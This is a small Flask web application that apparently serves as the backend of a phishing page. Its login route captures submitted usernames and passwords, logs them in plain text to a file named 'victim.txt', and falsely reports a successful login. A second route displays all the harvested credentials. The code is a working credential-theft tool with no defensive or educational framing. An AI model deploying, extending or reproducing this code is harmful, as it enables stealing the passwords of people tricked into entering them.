from flask import Flask, render_template, request
import subprocess

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        print("Username: ", username)
        print("Password: ", password)

        with open('victim.txt', 'a') as f:
            f.write(f'Username: {username}, Password: {password}\n')

        return 'Logged in successfully'

@app.route('/victim_info')
def victim_info():
    victim_data = []
    with open('victim.txt', 'r') as f:
        for line in f:
            victim_data.append(line)
    return render_template('victim_info.html', victim_data=victim_data)

if __name__ == '__main__':
    app.run(debug="True")
